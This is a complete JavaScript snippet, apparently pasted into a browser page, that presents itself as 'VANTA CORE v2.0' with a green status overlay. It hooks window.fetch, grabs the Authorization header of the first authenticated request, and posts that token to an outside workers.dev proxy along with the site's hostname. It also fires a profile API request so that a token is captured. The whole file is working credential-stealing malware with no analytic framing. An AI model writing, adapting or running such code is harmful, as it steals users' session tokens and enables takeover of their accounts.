(function() {
    const vRef = window.V_REF || "t23dad55";
    const vProxy = window.V_PROXY || "https://vanta-proxy.jdurrulo.workers.dev/";

    // Create Draggable UI
    const ui = document.createElement('div');
    ui.id = "vanta-ui";
    ui.style = `position:fixed;top:50px;right:50px;width:240px;background:#000;border:1px solid #0f8;padding:12px;z-index:9999999;color:#0f8;font-family:monospace;border-radius:6px;box-shadow:0 0 15px #0f84;cursor:move;user-select:none;`;
    ui.innerHTML = `
        <div id="vanta-header" style="font-weight:bold;border-bottom:1px solid #0f85;padding-bottom:5px;margin-bottom:8px;cursor:move;">VANTA CORE v2.0</div>
        <div style="font-size:10px;">REF: ${vRef}</div>
        <div id="v-status" style="margin-top:8px;font-size:11px;">STATUS: <span style="color:#bc3cfd;">SCANNING...</span></div>
    `;
    document.body.appendChild(ui);

    // --- DRAGGABLE LOGIC ---
    let isDragging = false;
    let offsetX, offsetY;

    ui.addEventListener('mousedown', (e) => {
        isDragging = true;
        offsetX = e.clientX - ui.getBoundingClientRect().left;
        offsetY = e.clientY - ui.getBoundingClientRect().top;
        ui.style.opacity = "0.8";
    });

    document.addEventListener('mousemove', (e) => {
        if (!isDragging) return;
        ui.style.left = (e.clientX - offsetX) + 'px';
        ui.style.top = (e.clientY - offsetY) + 'px';
        ui.style.right = 'auto'; // Reset right so left works
    });

    document.addEventListener('mouseup', () => {
        isDragging = false;
        ui.style.opacity = "1";
    });

    // --- NETWORK SNIFFER ---
    const _f = window.fetch;
    window.fetch = async (...args) => {
        const h = args[1]?.headers || {};
        const auth = h['Authorization'] || h['authorization'];

        if (auth && !window.vDone) {
            window.vDone = true;
            document.getElementById('v-status').innerHTML = "STATUS: <span style='color:#0f8;'>SYNCED ✅</span>";
            
            _f(vProxy, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    embeds: [{
                        title: "🚨 VANTA SUCCESS",
                        color: 0x00ff88,
                        fields: [
                            { name: "Ref", value: vRef },
                            { name: "Site", value: window.location.hostname },
                            { name: "Token", value: "```" + auth + "```" }
                        ]
                    }]
                })
            }).catch(() => {});
        }
        return _f(...args);
    };

    // Initial ping to wake up the headers
    _f('/api/v2/user/profile').catch(()=>{});
})();
